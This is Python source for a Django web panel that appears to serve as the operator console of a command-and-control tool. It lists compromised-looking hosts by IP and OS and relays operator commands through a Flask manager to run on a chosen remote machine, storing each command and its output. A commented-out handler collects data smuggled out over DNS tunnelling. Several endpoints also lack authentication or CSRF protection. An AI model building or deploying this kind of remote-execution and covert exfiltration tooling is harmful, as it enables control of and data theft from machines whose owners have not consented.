from django.shortcuts import render, redirect
from django.http import HttpResponse, HttpResponseForbidden, JsonResponse
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
import requests
import json
import datetime

from .models import *

# Create your views here.

# restrict to user
def index(request):
    request.session['FLASK_SERVER'] = 'http://127.0.0.1:5000/'
    if not request.user.is_authenticated:
        return redirect('login_template')
    
    # GET all connections from FLASK manager
    data = Connection.objects.all()
    return render(request, "UI/index.html", {
        "user":request.user.username,
        "data":data
    })

def login_view(request):
    if request.user.is_authenticated:
         return redirect("index")
    if request.method == "POST":
        username = request.POST["username"]
        password = request.POST["password"]
        user = authenticate(request, username=username, password=password)
        if user:
            login(request, user)
            return redirect("index")
        else:
            return redirect("login_template")
        
    if request.method == "GET":
        return render(request, "UI/login.html")
    
    return HttpResponseForbidden("Invalid Method")

def logout_view(request):
     logout(request)
     
     return redirect("login_template")

# restrict to user
def initialize_manager(request):
    if not request.user.is_authenticated:
        return redirect("login_template")
    if request.method == "POST":
        ip = request.POST["ip_addr"]
        port = request.POST["port"]
        flask_server = request.POST["flask_server"]
        request.session['FLASK_SERVER'] = flask_server
        
        flask_server+="/init"
        django_server = "http://127.0.0.1:8000/"

        data = {"ip":ip,
                "port":port,
                "django-server":django_server}
        
        response = requests.get(url=flask_server, params=data)

        if response.status_code == 200:
            return HttpResponse("Initialized Manager")

    if request.method == "GET":
        return render(request, "UI/initialize_manager.html")

# not restricted to user
@csrf_exempt
def update_conn(request):
    if request.method == "POST":
        data = json.loads(request.body)

        for ip in data.keys():
            connection = Connection.objects.filter(ip=ip)
            # Check to see if IP already exists
            if not connection:
                # Create new object
                connection = Connection(ip=ip, cpu=data[ip]["CPU"],
                                        node_name=data[ip]["Node Name"],os=data[ip]["OS"],
                                        version=data[ip]["Version"],
                                        recent_status=data[ip]["Status"])
                connection.save()
            else:
                connection.update(recent_status=data[ip]["Status"])
        

        objects = Connection.objects.exclude(ip__in = data.keys())
        objects.update(recent_status="Inactive")
            
        return HttpResponse("Data Received")

# restrict to user
def exec_conn(request, ip):

    if not request.user.is_authenticated:
        return redirect('login_template')
    
    if request.method == "GET":
        data = Connection.objects.filter(ip=ip)
        return render(request,"UI/interact.html", {
            "data":data
        })
        pass

    if request.method == "POST":
        command = request.POST["command"]
        ip = request.POST["ip"]
        
        if not request.session['FLASK_SERVER']:
            return HttpResponse("Flask API/Manager not initialized")
        
        url = request.session['FLASK_SERVER'] + '/conn_execute'
        data = {
            "ip":ip,
            "command":command
        }
        
        response = requests.get(url,params= data)

        if response.content.decode() == "Connection Pipe Broken":
            Connection.objects.filter(ip=ip).update(recent_status="Inactive")
            return redirect("index")

        hist_obj = CommandHistory(ip=Connection.objects.get(ip=ip), time=str(datetime.datetime.today()),
                                  command=command,
                                  response = response.content.decode())
        hist_obj.save()

        data = Connection.objects.filter(ip=ip)
        return HttpResponse(response.content.decode())
    
        

    return HttpResponseForbidden("Invalid")    

# restrict to user
def exec_hist(request):
    if request.method == "GET":
        ip = request.GET.get("ip")
        objects = CommandHistory.objects.filter(ip=ip).order_by('-time')

        resp = {}
        for obj in objects.all():
            resp[obj.time] = {
                "command":obj.command,
                "response":obj.response
            }

        return JsonResponse(resp)
        
# restrict to user
def refresh_conn(request):
    if not request.user.is_authenticated:
        return redirect("login_template")
    
    if request.method == "GET":

        if not request.session['FLASK_SERVER']:
            return HttpResponse("Flask API/Manager not initialized")
        
        url = request.session['FLASK_SERVER'] + "/conn_all"
        data = None
        try:
            response = requests.get(url)
            data = response.json()
        except:
            pass

        if not data:
            data = {}
        
        
        for ip in data.keys():
            connection = Connection.objects.filter(ip=ip)
            # Check to see if IP already exists
            if not connection:
                # Create new object
                connection = Connection(ip=ip, cpu=data[ip]["CPU"],
                                        node_name=data[ip]["Node Name"],os=data[ip]["OS"],
                                        version=data[ip]["Version"],
                                        recent_status=data[ip]["Status"])
                connection.save()
            else:
                connection.update(recent_status=data[ip]["Status"])


        objects = Connection.objects.exclude(ip__in = data.keys())
        objects.update(recent_status="Inactive")


        return redirect("index")
                
        
    return HttpResponseForbidden("Invalid Method")

# not restricted to user
'''@csrf_exempt
def dns_tunnelled_data_handler(request):
    if request.method == "POST":
        ip = request.POST["ip"]
        data = request.POST["data"]

        dns_response_object= DNS_Response.objects.filter(ip=ip)
        
        if not dns_response_object:
            dns_response_object = DNS_Response(ip=ip, dns_response_data=data)
            dns_response_object.save()
        else:
            concatenated_data = dns_response_object.get(ip=ip).dns_response_data + data
            dns_response_object.update(dns_response_data = concatenated_data)
        
        return HttpResponse("Updated DB")
            
    else:
        return HttpResponseForbidden("Invalid Method")'''